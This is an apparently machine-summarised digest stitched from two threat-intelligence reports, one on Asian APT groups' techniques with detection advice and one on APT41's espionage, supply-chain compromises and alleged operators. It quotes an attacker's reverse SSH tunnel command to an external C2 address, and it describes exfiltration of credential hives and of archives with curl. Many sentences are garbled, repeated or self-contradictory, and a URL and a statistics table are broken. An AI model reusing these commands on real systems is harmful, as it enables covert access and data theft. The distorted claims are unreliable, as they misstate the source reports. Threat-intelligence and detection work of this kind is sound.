for this technique may include ones that are also used for the Command and Scripting Interpreter technique . In a cloud infrastructure, attackers may use APIs or command-line interfaces .  \"Cloud Service Dashboard\" and \"Cloud Storage Object Discovery\" to identify hosts in cloud infrastructures . One example of this technique is when an attacker starts scripts that automatically collect relevant information from an infected machine . Below are some examples that we encountered when analyzing the incidents mentioned in the report .  One of the ways to detect the Automated Collection T1119 technique is to look for process creation events and the execution of PowerShell script blocks . You should pay close attention to any running utilities or tools that were mentioned above, and analyze the command-line contents (with audit enabled)  The Data from Local System T1005 technique can be detected by tracking process creation events . You should pay close attention to any running utilities or tools that were mentioned above, and analyze the command-line contents (with audit enabled) Attackers often try to exfiltrate data from the infected system .  Many APT groups use remote command and control centers (C2) in their attacks . Threat actors most frequently use an application-layer protocol to interact with their own servers . Attackers may receive commands from their C2 server and send the results of command execution back to the server .  APT groups use these protocols to communicate with their C2 from their victim's network by imitating normal, expected traffic . The APT group known as ToddyCat communicated with a C2 over the HTTPS protocol . After establishing a connection with its C2 server, a remote access tool (RAT) was able to run on the victim's machine .  The APT group known as CopperTurtle uses the HTTPS protocol to interact with their C2 . After the backdoor was loaded into memory, it forwarded the information collected about its victim to a C2 server . In turn, the specific commands to execute on the victim's system were sent to the backdoor .  The Cobalt Strike implant communicates with a C2 server over the HTTP protocol . A file (MD5: 4e43c0ca1feebc1c7107a8ebb53255b9) that was found during an incident investigation uses HTTPS to interact with its C2. as a legitimate one .  All of the analyzed examples attempt to look legitimate, which makes detection of the T1071.001 technique more difficult . Malicious activity related to communication with C2 is detected primarily by conducting a Suricata-based signature analysis of traffic in IDS/IPS systems .  The Web Service T1102 technique uses existing legitimate web services to transfer data between the victim's computer and a remote system . Popular websites and social networks can be used to effectively conceal communication with a C2 because hosts on a network can't be identified .  Popular social networks or cloud services are most frequently used for C2 communication . Most web services normally use SSL/TLS encryption, which provides attackers with an additional layer of protection from detection . We know of several examples of Asian APT groups abusing publicly accessible cloud storage .  To detect the Web Service technique, you must track network requests that are sent to popular web services . In a correlation rule, you can filter applications used to work with the cloud and other services, as well as popular web browsers . Customized exclusions and filters can be configured for each company, and appropriate correlation rules must be trained accordingly .  Asian APT groups download malicious files in several stages during their attacks . Second-stage malware is downloaded to a target host from a C2 server that stores malicious files for subsequent stages as well as auxiliary tools for supporting an attack . Files are also transferred using various web services (as described above) or other systems available to the attacker .  The Ingress Tool Transfer T1105 technique was also used in the attack on Pakistan involving the ShadowPad and PlugX backdoors . The APT group ToddyCat used its own RAT to download additional tools to the victim's computer .  The second-stage Stowaway implant is extracted using the Ingress Tool Transfer T1105 technique . You must track network connections (for example, those involving Sysmon Event ID 3) and process creation events . One detection approach is to track network interactions from legitimate trusted processes .  As described above, you can create correlation rules for network requests that are sent to popular web services such as cloud storages, GitHub, social networks, and various messengers like Telegram or Discord . Another way is to track the startup of console-based utilities that enable downloading of files from external systems .  Protocol Tunneling is also used for access to network segments/resources that can only be accessed by connecting from an internal network of the company (Pivoting) A typical example of tunneling is SSH port forwarding . In one attack, an Asian APT group used SSH tunneling to communicate with a C2 server .  The APT group uses a port that is not typical for SSH (the \"-p 443\" option), therefore the connection with C2 will look like a normal connection over HTTPS . Inbound traffic to the localhost via port 50846 is forwarded to port 7070 . The figure below illustrates the interaction between hosts via SSH tunneling .  \"C:\\Program Files\\OpenSSH\\ssh.exe\" -i C:\\Windows\\AppReadiness\\read.ini -o StrictHostKeyChecking=accept-new -R 50846:localhost:7070 systemtest06@103.27.202[.]85 -p 22222 -fN. listens to port 7070 on the localhost .  iox17 utility being used for port forwarding and traffic proxying . This technique can be detected with standard telemetry tools (Windows Events, Sysmon) by tracking typical command-line patterns in process creation events . Attack activity can also be detected by tracking network connection .  You can set up another security beacon that tracks network connections to untrusted addresses or addresses with a bad reputation . To implement this protective measure, you must have up-to-date information about the IP addresses and domains of attackers . This type of information is provided by Kaspersky Threat Data Feeds .  Cloud storage services are the most convenient services for data exfiltration because a firewall normally allows outbound connections to these services . attackers include popular cloud services, code repositories such as GitHub, file sharing services, and messengers such as Telegram .  APT31 also has samples that use Yandex Disk . Its arguments include the directory from which the archive should be exfiltrated and an API token for accessing Dropbox . The passed arguments may include an authentication token, file path, and some other parameters .  A \"WebDav-O Yandex\" malware variant was used (MD5: 21F7A530CB718A32E08D4AE8207F7D4D) This implant allows saving files containing commands to be run on the host and sending the collected data to storage . To access the storage, the implant code included the account credentials required for negotiating the encryption key .  ToddyCat group uses a tool called Dropbox Uploader to send collected data to Dropbox . It uses the DELETE method to delete files specified as the command argument . It searches the current directory for files with extensions with the following extensions: .z; .001; .002; .003; .004; .005; .006; .007; .008; .009; .010; .011; .012; .013; .014; .015; .01; .02; .03; .04; .05; .06; .07; .08; .09; .  Attackers used the console-based curl utility to send the generated archive to file.io . To detect data exfiltration through cloud services, you must track network connections to those services from processes that do not normally interact with cloud storage services . In a correlation rule, you can filter applications used to work with cloud and popular web browsers .  Malware files can masquerade as legitimate processes by using various techniques, including the following: Process Injection T1055, Masquerading T1036, Hijack Execution Flow T1574 . To detect these techniques, please refer to the sections describing them . Exfiltration over C2 Channel technique is used by attackers for data exfiltration from a target system .  Asian APT groups use a broad spectrum of post-exploitation methods and tools . Exfiltration can be implemented directly in malware written by attackers without using additional tools or commands . The most popular tools used by attackers include Cobalt Strike and PlugX .  Some of the exfiltration commands that were executed by attackers on compromised hosts are shown below: PSCP (PuTTY Secure Copy Protocol) is a console-based utility that transfers files between two systems via SCP . Plink is a PuTTY client that an attacker can use to verify the successful transfer of files . The attackers sent saved SAM, SYSTEM, and SECURITY hives to a remote server to extract account credentials .  The Base64-encoded string in the script above represents the following code: To send their collected RAR archives in a REST API . The decrypted script looks as follows: Exfiltration TA0010 | Exefiltration Over C2 Channel T1041 .  Exfiltration often involves a large amount of data, therefore any unusual bursts of network traffic may be an indicator of data leaks . In a SIEM system, you can detect this technique through a netflow analysis . This type of rule can also be used in combination with other rules .  EPP solutions track activity on a host, including system events, network traffic, and API function calls . The Crypto API can also be used to encrypt data before it is sent to a C2 server . A SOC can use threat intelligence sources to detect known C2 domains and IP addresses associated with known APT groups .  APT groups often obfuscate commands they execute . Obfuscated Files or Information T1027 technique . You must also track the startup of various post-exploitation tools and utilities that can be used for data exfiltration . Modern Asian APT Groups: Tactics, Techniques and Procedures .  APT groups rarely perform actions that deliberately disrupt the performance of a compromised system . Main objective of these groups is to remain undetected and collect data (cyber-espionage) for as long as possible . Attackers who have the discipline to adhere to this strategy can stay undetected in a victim's infrastructure for years .  Popular Cyber Threat Intelligence methodologies and models that strive to understand an attacker's movement through an infrastructure are not always capable of describing an attack chain . The most popular model is the Cyber Kill Chain (CKC), which was developed in 2011 by the Lockheed Martin Corporation . In our aim to use a model that properly addresses the modern threat landscape .  The Unified Kill Chain (UKC) expands the CKC model by merging the improvements previously proposed by other authors with the attacker tactics presented in the MITRE ATT&CK matrix . The UKC model also demonstrates that attackers do not need to complete each attack phase in a specific sequence .  Modern cyberattacks follow a phased progression toward strategic objectives and can be described in terms of tactics, techniques, and procedures (TTPs) Using a hybrid research approach, 18 phases were identified that can be used to describe modern cyberattacks . The table below shows the individual attack phases and their expected order .  Delivery Techniques resulting in the transmission of a weaponized object to the targeted environment . Social Engineering Techniques aimed at the manipulation of people to perform unsafe actions . Exploitation Techniques to exploit vulnerabilities in systems that may, amongst others, result in code execution .  Modern Asian APT Groups: Tactics, Techniques and Procedures In Through Out . The Cyber Kill Chain phases are combined into three main groups: In, Through, and Out Analysis of attacker actions . Analysis of attackers actions is combined into a three main group: In Through, through, and out Analysis of the attacker's actions .  We used the Unified Kill Chain model to create our own table linked to Asian APT groups . Each group corresponds to the different intentions of attackers: In: attackers attempt to gain access to systems or data available only to trusted users or devices . Through: after infiltrating the infrastructure, attackers try to obtain the privileges that are required for fulfilling their initial plans . Out: after obtaining the necessary access and privileges, the attackers achieve their initial objectives: exfiltrating data (cyber-espionage) or influencing operation of critical components (sabotage)  This table contains the phases described in the UKC and techniques that we were able to detect and correlate with the specific phases . It also contains additional details that will help you understand the motives and actions of attackers at a specific phase . This table includes additional details on the techniques and the possible steps taken by these groups .  Asian APT groups may be targeting organizations whose activity is related to technological innovations, armaments, government regulation, energy, or other important industries . They target organizations or employees who may have access to valuable intellectual property or government secrets . This information is gathered to compile a victim profile and generate appropriate phishing messages for future use .  Asian APT groups test their attack arsenal to see if their tools can be detected by security products . The attackers make sure that all of the malware components that will be used in the attack are not, upon their release, detected or blocked by cybersecurity tools . If they are detected, the malware developers attempt to ascertain which specific code segment or component was detected by the security tools .  Asian APT groups are generally low priority for stealth and concealment . Their main objective is to collect as much important information as possible as quickly as possible . For this reason, if a detection occurs on an infected machine, they often try to find a way to evade this detection .  A favorite subtechnique used by Asian APT groups is known as Phishing: Spearphishing . Instead of mass mailing phishing messages, attackers specifically select their victims after carefully studying their profiles and network behavior . This enables the attackers to create more persuasive and personalized phishing emails or messages .  The attacker attempts to exploit specific processes within the victim's organization . The attacker may also target specific individuals or management officers to gain access to their personal information . Asian APT groups are known for their advanced technical skills and exploitation of various vulnerabilities .  Asian APT groups establish persistence within an infrastructure by using a multitude of procedures and techniques ranging from the simplest to the most complicated . They attempt to exploit popular vulnerabilities in web applications, mail ser- vices, remote administration tools, and many other resources .  A combination of the Create or Modify System Process: Windows Service T1543.003 + Hijack Execution Flow: DLL Side-Loading T1574.002 . This combination is especially notable because it is associated with multiple MITRE ATT&CK tactics, including persistence, privilege escalation, and defense evasion .  Asian APT groups often create a service that is concealed behind the svchost.exe process . The service process creates a new legitimate process in the suspended state, and a backdoor for interacting with the command and control center is injected into this process .  APT groups no longer try so hard to conceal their malicious activity in the targeted infrastructure . Their goal is to steal as much information as possible as quickly as possible . In case the attack is being ignored by security personnel, they try to remain in the network as long as possible.  APT groups use various resources to disable security tools . These may include utilities specially created for this purpose, or utilities that are already available in the operating system . The simplest techniques used by attackers are related to the Masquerading T1036 technique .  The most frequently used masquerading methods are to create and start processes/ services/files that look like legitimate ones in the operating system . Most use the HTTP and HTTPS protocols for C2 communications . The observed groups use various backdoors to interact with a CnC server . They most frequently use a dynamic library that is executed via the DLL Side-loading technique .  To download a payload to a victim's computer, attackers use programs such as certutil.exe and bitsadmin.exe . The backdoor is started by creating a new service or a scheduled task . After establishing a connection with the command and control center, the backdoor runs a command shell .  Asian APT groups gather information about the target network and its configuration to identify the best ways to continue their attack . Pivoting allows attackers to execute their C2 commands on hosts that are concealed behind firewalls, network address translation (NAT), or other technologies .  Asian APT groups use Windows services or scheduled tasks to execute their payload . Attackers may also run a CMD command shell to execute commands received from their C2 server . The PlugX backdoor, specifically the XPlugService module, can access commands related to Windows services .  APT groups often resort to using the wmic utility and the Wmiexec module from Impacket framework . They also use Batch and PowerShell scripts to automate their activities such as host discovery and data collection . Credential Access T1003 and TA0006 tactics are the most common .  Asian APT groups search for account credentials that are revealed in cleart- ext within files and in registry hives . This phase allows them to access valuable account credentials . They primarily use the SMB protocol to move between hosts . As they move through the network, they establish persistence on remote systems .  Asian APT groups use popular modules SMBExec, Atexec, Wmiexec, and PsExec from Impacket framework . They also use RDP to connect to remote systems . Asian attackers use various archivers to gather data from victim's computers .  Asian APT groups move archives to Recycle Bin (C:\\$Recycle.Bin) before their subsequent exfiltration . This is known as the Exfiltration Over C2 Channel T1041 technique . The attackers compress this data and forward it to a server that is usually acting as their command and control center .  Asian APT groups create their own tools for data exfiltration to cloud storage, including Dropbox, Google Drive, Yandex Disk . Intelligence data can be used to successfully block connections to the attacker's C2 server . When starting their own services they may also query services that are already running in the target system and stop them .  The overwhelming majority of Asian APT groups ultimately pursue the following goals: Cyber-espionage . The primary motivation is to acquire sensitive information and technological data from other governments, companies, or organizations . The data may include intellectual property, trade secrets, patents and other data that can provide a competitive advantage .  Recommendations for the use of various security measures at the stages of the Unified Kill Chain . Some APT groups may hack organizations for financial benefit by stealing payment details or conducting Ransomware attacks to demand ransom payments . Others for the purpose of acquiring financial information that could be used for commercial gains .  Hardening&Security is a set of measures to strengthen the protection of the organization’s infrastructure . It includes building BlueTeam processes: Security Operations (SOC), Threat Hunting (TH), Digital Forensics & Incident Response (DFIR), Cyber Threat Intelligence (CTI)  SIEM can detect attackers during one or another of their attack phases . However, this is only true if the targeted organization monitors all hosts . This knowledge must include every possible detail, ranging from the number of hosts and operating systems installed on them to the network topology and potential traffic between its segments .  A continual asset inventory process is crucial for infrastructure security . Information about the company's existing workstations, servers, firewalls, routers, gateways, and other resources must be accurate . Fine-tuned patch management and vulnerability management processes help significantly reduce opportunities for attackers .  Vulnerability management is an important part of an overall security program . Timely detection and correct remediation of vulnerabilities help significantly improve the security of a company . Asian APT groups attempt to find vulnerable components of systems during initial access as well as after infiltrating an infrastructure .  Some groups perform mass infrastructure scans to find vulnerable components . State-of-the-art EPP, EDR, and sandbox solutions help prevent the execution of malicious code on enterprise hosts . IDS and IPS solutions help detect and prevent network connections that are identified as malicious .  Consider using Deep Packet Inspection technology (DPI) to expand your traffic analysis capabilities . Filtering inbound traffic on edge devices such as routers and firewalls . Consider setting up an update and vulnerability patching process that is customized for the specific infrastructure .  Protocols like NBT-NS and LLMNR allow attackers to conduct Man-in-the-Middle attacks . NTLM protocol is architecturally vulnerable to relay attacks . A modern network environment allows you to use DNS and Kerberos protocols for the same purposes as those older .  Asian APT groups use many ways to dump credentials, both through self-written malware and using system legitimate utilities . Credential Guard technology provides a security component that lets you store account credentials in the address space of an isolated LSA process .  Consider implementing policies that regulate which specific users can start certain applications . If specific software cannot work with newer protocols, you should consider allocating a separate network for hosts where the obsolete software is installed . This will help limit exploitation of vulnerable technologies .  Asian APT groups use various services for exfiltration of targeted information, such as cloud storage . The asset management, configuration management and identity management processes help us understand which devices in an organization typically connect to external (untrusted) resources . Consider using honeypots in the infrastructure to increase your chances of detecting an attack before any real damage is done .  This section includes statistics on companies targeted by APT groups in Asia . Consider implementing Zero Trust principles in your organization . The main concepts and principles of this type of architecture are discussed in NIST Special Publication 800-207 . Use this information to help reduce the risk of unauthorized access .  These statistics were formed from the following methodology: samples taken from the global threat data network known as Kaspersky Security Network (KSN) samples were fed as input into the Kaspersy Threat Attribution Engine . The samples that were attributed to Asian APT groups were additionally enriched with information about the particular industry and country .  APT actor Top 5 countries by volume of victims . Egypt Iran Iran Japan India Germany Germany 13% 11% 9% 8% 8%. Egypt Iran Turkey Russia India 12% 11%. 10% 10% 6%. 6% 6% 16% of the victims of all groups .

Vicious Panda Construction Government . sector 56% 29% 15% of victims .  The “Asian threat” is especially dangerous for government agencies and the military-industrial complex . The campaigns of Asian groups are directed against organizations from many industries and are not limited to one region . As victimology research shows, they are especially active in relation to government and military structures .  Asian APT groups have their own signature of attacks characteristic of the work of groups from Asia . Most attacks carried out by Asian APTs consist of simple steps and involve the use of well-known utilities . The success of these attacks is explained by the weak level of development of information security processes in the victim .  Report can be used as a guide to building defenses against Asian APT attacks . It includes potential protection mechanisms, including SIGMA rules that are ready to be implemented in the infrastructure . An effective security strategy includes properly organized processes in the SOC, security tools and special security mechanisms .

Annex: MITRE ATT&CK Mapping Mapping .  APT41 is a Chinese state-sponsored espionage group that is also conducting financially motivated activity for personal gain . FireEye Threat Intelligence assesses with high confidence that APT 41 is a state-backed espionage group . The group's operations against higher education, travel services, and news/media firms provide some indication that the group also tracks the group .  APT41 carries out an array of financially motivated intrusions, particularly against the video game industry, including stealing source code and digital certificates, virtual currency manipulation, and attempting to deploy ransomware . The group has executed multiple software supply chain compromises, gaining access to software companies to inject malicious code into legitimate files before distributing updates .  APT41 is unique among tracked China-based actors in that it leverages non-public malware typically reserved for espionage operations . The group's cyber crime activities are most likely motivated by personal financial gain or hobbyist interests . This contrasts with the state-sponsored goals that likely drive the group's healthcare, high-tech, and politically related targeting .  APT41's history of financially motivated targeting of the video game industry has ultimately supported the group's state-sponsored activity . The group's distinct use of supply chain compromises to target select individuals, consistent use of compromised digital certificates, and deployment of bootkits highlight a creative and well-resourced adversary .  APT41 targets industries in a manner aligned with China's Five-Year economic development plans . Some campaigns attributed to the group indicate that the group is also deployed to gather intelligence ahead of imminent events, such as mergers and acquisitions (M&A) and political events .  APT41 has targeted organizations in 14 countries (and Hong Kong) over seven years, including: France, India, Italy, Japan, Myanmar, the Netherlands, Singapore, South Korea, South Africa, Switzerland, Thailand, Turkey, the United Kingdom, and the United States (Figure 1) The group's state-sponsored activity and its own cyber crime operations are demonstrated in the group's simultaneous operations .  APT41 espionage targeting has changed significantly over time, suggesting shifts in assigned missions or new contracts to complete . A breakdown of industries targeted over time can be found in Figure 2 . We have not observed evidence of IP theft since late 2015 .  Campaigns have expanded into additional industries including telecoms, the automotive sector, higher education, and travel services . APT41's activities have included a series of supply chain compromises . The operation injects malware into legitimate server software packages used by hundreds of companies worldwide .  APT41 targeting is consistent with China's national strategies to move production capabilities upmarket into research and development (R&D)-heavy fields . These initiatives were especially highlighted with \"Made in China 2025,\" a plan announced in 2015 that aims to shift China's economy toward higher value products and services .  APT41 has targeted organizations involved in the research, development, and sale of computer components used for machine-learning, autonomous vehicles, medical imaging, and the consumer market . The timing of multiple intrusions attributed to the group indicate a focused interest in strategic business decisions, including entry into the Chinese market .  Since 2017, APT41 has consistently targeted telecommunications companies, possibly a crucial first step to establish a foothold in targeting a particular region . Targeted telecom companies spanned several countries, and recently identified intrusions were concentrated in countries where we had not identified any prior activity .  A hotel was targeted two weeks ahead of a diplomatic visit in which high-ranking Chinese officials stayed there . Personal data within the reservations system was directly accessed, suggesting the group was potentially tasked to reconnoiter the facility . In July and August 2016, APT41 sent spear-phishing emails to Hong Kong media organizations known for pro-democracy editorial content .  A spear-phishing email with the subject-line \"help\" was later sent to one of the previously targeted organizations in October 2017, coinciding with the sentencing of pro-democracy Occupy activists in Hong Kong . In 2015, APT41 targeted a Japanese media organization with a lure document titled “Prevention of Middle East Respiratory Syndrome (MERS)”  APT41 activity aimed at medical device companies and pharmaceuticals is demonstrative of the group's capacity to collect sensitive and valuable intellectual property . The healthcare sector was targeted in a manner that is highly specific and most likely indicative of focused taskings from sponsoring organizations with a stake in the healthcare market .  APT41 targeted a medical devices subsidiary of a large corporation . 30 percent of the victimized hosts were related to a subsidiary specialized in manufacturing medical devices . The observed activities are indicative of ongoing efforts to support China's own R&D efforts in support of Made in China 2025 .  APT41 conducts explicit financially motivated activity, which has included the use of tools that are otherwise exclusively used in campaigns supporting campaigns supporting the Chinese government . The operation targeted a biotech company undergoing acquisition in May 2015, and a separate biotech company in 2018 targeted a third healthcare company .  APT41 espionage operations over all observed activity are relatively close to Chinese work hours . Operational times at gaming targets are most frequent between 18:00 and 07:00 (UTC +8), providing some indication that the group is moonlighting . The group compiled malware for use in cyber crime activity even during espionage-focused working hours .  Analysis of compile times for all portable executable (PE) files suggests APT41's average working hours fall between 10:00 to 23:00 (UTC +8) The group has also targeted cryptocurrencies, including at least one case in which there was a connection between cryptocurrency and espionage .  APT41 sent spear-phishing emails using an invitation lure to join a decentralized gaming platform linked to a cryptocurrency service . In October 2018, the group compiled an instance of XMRig, a Monero cryptocurrency mining tool, demonstrating a continued interest in cryptocurrency . The body of the email (Figure 6) also mentions gaming offerings .  Report: MANDIANT APT41, A Dual Espionage and Cyber Crime Operation 16 From: Tom Giardino < > Date: <redacted> Subject: Project (FairWin) online application! Project Introduction: FairWin is a decentralized online gaming platform .  APT41 continues to return to targeting the video game sector and seems to have matured its campaigns through lessons learned in operations against the industry . The group leverages many TTPs during the targeting of video game-related organizations, which are likewise employed in their espionage operations . Campaigns have largely affected studios and distributors in East and Southeast Asia .  APT41 has repeatedly gained access to game development environments within affected companies, including online multiplayer networks, as well as targeting of production database administrators . The group is competent in both Linux and Windows environments and can pivot easily between both environments within a single operation, including compromising intermediary servers that provide access to separated Windows and Linux environments .  APT41 (or a closely affiliated actor) has a history of carrying out such operations against the video game industry . The insertion of malware into a build environment for later distribution with legitimate software is a natural extension of the group's earliest activities .  Bootkits are a stealthy means of installing malware because the code resides outside of the OS . The group used the Adore-NG rootkit on older Linux operating systems to hide their Linux backdoor ADORE.XSEC . APT41 reserves more advanced TTPs and malware only for high-value targets .  APT41 used a code-signing certificate from Mgame, a South Korean game publisher, against other gaming industry entities in 2012 . A different Mgame digital certificate has been used by several other Chinese operators, including APT17, APT20, and APT31 .  APT41 attempted to extort a game company by deploying the Encryptor RaaS ransomware . Ransomware-as-a-Service (RaaS) operation was available via a Tor (.onion) website . Users of the ransomware were charged a 20 percent fee for any collected ransom .  APT41 attempted to deploy the malware through a group policy (GPO) scheduled task . However, the malware was unsuccessfully deployed because of a simple typo . The ransom note contains default messages in both English and German . The languages in the note should not be considered when determining actor origin or location .  APT41 targeted third parties and leveraged this access to target additional victims . In 2014, APT 41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service . The payment service was likely targeted because it provided access to multiple gaming companies .  APT41 leverages a variety of TTPs to access production environments where they can inject malicious code into legitimate files . The files are signed with valid code-signing certificates . The company was targeted by TeamViewer in fall 2016 .  Supply chain operations add an additional layer of obscurity to the group's operations because it is difficult to pinpoint the desired target set . APT41 leveraged MAC addresses and C:\\ drive volume serial numbers to identify specifically targeted victims for follow-on activity . This significantly obfuscates the targeted sector or victim set .  In December 2014, installers for three online games published by a Southeast Asian video game distributor were injected with the SOGU backdoor . The installer for these popular games was replaced by a malicious file . The video game distributors operates servers in East and Southeast Asia for these games .  We have observed many similarities between TTPs involved in this compromise and APT41, including: Targeting the same victim organization 31 days apart . Use of code-signing certificates from the same video game-related issuer organizations . The three games that were compromised: Path of Exile, League of Legends, and FIFA Online 3 (Table 2)  In March 2017, suspected Chinese espionage operators targeted CCleaner, a utility that assists in the removal of unwanted files from a computer . Both APT41 and the actors in the incident used TeamViewer during initial compromise . According to parent company Avast, the infected software was downloaded by 2.27 million customers .  Malware samples identified in the CCleaner incident included notable shared design decisions observed in APT41 malware . DIRTCLEANER is believed to download a second-stage loader (MD5: 748aa5fcfa2af451c76039faf6a8684d) that contains a 32-bit and 64-bit COLDJAVA DLL payload . The payload contains shellcode that loads a variant of BLACKCOFFEE (Figure 8)  The BLACKCOFFEE sample reaches out to actor-controlled profiles hosted on legitimate websites to retrieve encoded commands for C&C . This is similar to first-stage malware used in the Netsarang compromise described below . The malware parses the content of the websites (listed in Table 3), looking for 12 bytes contained between the tags: \"BSM1cr0S0ft\" and \"SBM1Cr0Soft\" each month .  APT41 injected malicious code into a software update package maintained by Netsarang . The software package is reportedly used by hundreds of companies worldwide . Kaspersky observed numerous opportunistic infections associated with POISONPLUG.SHADOW spanning 13 countries .  The first stage of the malware uses DGA, which changes its C&C servers monthly . The use of shifting network infrastructure is most likely intended to add operational robustness and to reduce detection . The second-stage shellcode is only activated after it is activated using a decryption key retrieved from the first-stage DNS communications .  Malware Family notped.com POISONPLUG.SHADOW dnsgogle.com SOGU operatingbox.com and operating box.com . Report: MANDIANT APT41, A Dual Espionage and Cyber Crime Operation 25 TABLE 5. \"ShadowHammer\" stage-two POISON PLUG sample. File MD5 C&C Domain 37e100dd8b2ad8b301b130c2bca3f1ea .  In June 2018, a utility used to update ASUS computers was compromised in an operation dubbed \"ShadowHammer\" The malware was only designed to execute and retrieve second-stage malware on a designated list of 600 systems . Kaspersky's analysis of the infected machines revealed that a POISONPLUG backdoor was installed as a result of the malicious update .  The reported stage-two POISONPLUG backdoor is attributed to APT41, contained several gaming references, and was likely used to target the gaming industry . The payload uses DDR and parses the Google document for a C&C command . The Steam community page is likely used as a fallback mechanism .  APT41 appeared to have directly targeted several East and Southeast Asia-based video game developers and distributors to inject legitimate executables with the CRACKSHOT backdoor . The C&C domain that masquerades as Xigncode was used in the compromise of the video game PointBlank.com .  Identified overlaps across various incidents attributed to APT41 demonstrate the group's dual nature . Figure 9 and Figure 10 illustrate crossover between espionage and financially motivated activity . The same email address was used to send spear-phishing emails to a Taiwanese newspaper with the subject \"I have a little surprise for you :)\"  Hailsimon59@gmail.com was used to create a Google document being used as a POISONPLUG (MD5: 37e100dd8b2ad8b301b130c2bca3f1ea) As previously mentioned, this sample also connected to a Steam page . Email overlaps between espionage and financial activity .  Operation 28 S H A R E D C O D E identified at 1 unknown victim in Hong Kong . Stage 2 shellcode loader 72584d6b7dd10c82d9118567b548b2b1 C&C STAGE 2 activated at https://://://www.google.com/document/ d/1iQwnF3ibWPZ6-95VHrRAPrL6u_UT_K7X- rQrB7xt95k Identified at 1 victim .  Malware analysis identified source code overlaps between malware and source code . FireEye malware analysis identified a number of overlaps in the malware's source code files . The analysis was carried out using FireEye's PoisonShack API hashing tool . The malware code was analyzed by FireEye in conjunction with the malware .  In May 2016, APT41 deployed a POISONPLUG sample at a U.S.-based game development studio . The stage-one loader for this sample (MD5: 830a09ff05eac9a5f42897ba5176a36a) shares code overlaps with the stage-1 shellcode loader used in the Netsarang compromise, first reported by Kaspersky as ShadowPad .  Both loaders use the same API hashing algorithm to resolve routines from system libraries . Using this routine, the hash for kernel32. dll, a common DLL provided by Microsoft Windows, is 0xFD5B1261 . FireEye analysis of a separate POISONPLUG payload compiled in July 2017 identified multiple additional plug-in similarities .  APT41 is attributable to Chinese individuals who are working on behalf of the Chinese state in conducting cyber espionage operations, and that these actors are also running financially motivated campaigns for personal gain . Two identified personas using the monikers \"Zhang Xuguang\" and \"Wolfzhi\" have also been identified in Chinese-language forums .  Zhang Xuguang registered more than a dozen domains masquerading as video games or companies with trusted relationships with video game developers/distributors . Additional names include: akbklxp, akbkxlp, injuriesa, ravinder10, Addison Lau, and addison jack .  In 2005, Zhang posted personal information on a popular Chinese online forum that listed his date of birth as 1989 . Zhang's profile indicated he was 16, going on 17, and he was applying to be the administrator of a script hacking forum . Zhang Xugang's interest in these games is also apparent in his registration and posting on a forum dedicated to the Age of Wuxia forum .  Wolfzhi is linked to a 2017 profile on a data science community page, which indicated that he had 10 years working experience in Oracle and Python . Additional aliases include: wolf_zhi, wolfjiao, jiaozhiq, and jiauzhiqiang . This is consistent with information found in early domain registrations created by Wolfzh .  APT41 relies on malware used exclusively by Chinese espionage operators . The use of Chinese-language strings, time zone and operational time analysis, and targeting consistent with Beijing's interests . The group also leverages PHOTO (aka Derusbi) and SOGU (aka \"Destroy RAT\" and \"PlugX) tools shared more widely among Chinese espionage groups .  Compile and operational times of APT41 activity suggest the bulk of the group's work hours, 10:00 and 23:00 (UTC +8), are consistent with the Chinese workday, especially for tech sector employees on a \"996 schedule\" Targeting of healthcare, semiconductors and telecoms is consistent with Chinese state interests and parallels activity from other Chinese espionage groups .  APT41's use of the same malware in both financial- and espionage-related operations could support their status as contractors . State employees are less likely to use such tools for personal financial gain over multiple years given the potential for greater scrutiny or punishment .  Public reports on Chinese hackers highlight that skilled actors opt to work for private sector entities that have government contracts . Zhang Xuguang advertised on forums that he was available for professional penetration and hacking services . Zhang listed his online hours from 4:00 p.m. – 6:00 a.m., which are similar to the operational times observed at gaming targets .  APT10 was operated by contractors working for the China's Ministry of State Security (MSS) APT41 overlaps at least partially with public reporting on groups including BARIUM (Microsoft) and Winnti (Kaspersky) Initial reports about HIGHNOON and its variants (reported publicly as \"Winnti\") dating back to at least 2013 indicated the tool was exclusive to a single group .  APT41 reflects our current understanding of what was previously reported as GREF, as well as additional indicators and activity gathered during our extensive review of our intelligence holdings . Report: Certificate issued by YNK Japan that was publicly reported as being used by Winnti has been used by multiple Chinese espionage operators .  A self-signed digital certificate purporting to be from the Microsoft Certificate Authority has been used by both APT41 and APT40 to sign samples of the PHOTO backdoor . The overlaps in groups observed using these certificates is illustrated in Table 8 .  A significant number of non-public tools used by APT41 are shared with other distinct Chinese espionage operators . Source code overlaps between observed code families indicate potential access to shared code repositories or common developers between groups . The use of a valid and digitally signed executable is used to trick a system into launching a malicious DLL .  Table 9 contains legitimate executables used by APT41 and selected other Chinese cyber espionage groups for DLL side-loading . This explains why the use of these DLL filenames is not a unique indicator for distinct APT operators .  APT41 HighNOON.BIN samples reference \"PlusDll.Dll\" and contains reference to PlusDll . D:\\RBDoor\\Anti_winmm\\App Init\\AppInit\\Release\\Appinit.pdb a0a96138b57ee24eed31b652ddf60d4e . APT1 APT3 APT4 APT10 APT17 APT18 APT19 APT40 APT39 APT42 APT38 APT44 APT23 APT24 APT  APT41 has used CROSSWALK.BIN, a kernel driver, to circumvent firewalls and covertly send data . Another Chinese espionage group used a similar tool, CLASSFON, to covertly proxy network communications in 2011 .  APT41 samples with PDB paths containing \"RBDoor\" found in \"Technical Annex: Additional Malware Overlaps\" The report was published in \"Report: MANDANT APT 41, A Dual Espionage and Cyber Crime Operation 38\"  APT41 regularly leverages code-signing certificates to sign malware when targeting both gaming and non-gaming organizations . Most of the digital certificates are valid unrevoked digital certificates stolen from East Asia-based game development studios . Microsoft requires all kernel-mode drivers to be signed in order to run on operating systems running Windows Vista or later .  Stealing private keys or compromising an organization's infrastructure to access and steal digital certificates abuses trust relationships between firms and certificate authorities . Malicious files signed with valid digital certificates can circumvent automated scanning/ blocking solutions and bypass Windows group policies . Even when detected, malicious files signed by a digital certificate from a trusted partner or associated business are less likely to draw suspicion .  Certificate authorities are responsible for revoking compromised digital certificates . Several malware samples were signed very close to the certificate issue date, suggesting APT41 or a related actor had access to the private key or build environment at that time . It is also possible the group acquired the private keys soon after they were issued .  APT41 may have purchased digital certificates used for signing malware . FireEye researchers found that code signing certificates are currently available for sale in underground marketplaces for as little as $399 USD . Indicators associated with these certificates are listed in \"Technical Annex: Code Signing Certificates Used by APT 41\"  APT41 is a dual threat demonstrating creativity and aggressiveness in carrying out both espionage campaigns and financially motivated operations . The group's capabilities and targeting have both widened over time, signaling the potential for additional supply chain compromises affecting more victims in additional verticals . The links to underground marketplaces and state-sponsored activity may indicate the group enjoys protections that enables it to conduct its own for-profit activities .  APT41, a Dual Espionage and Cyber 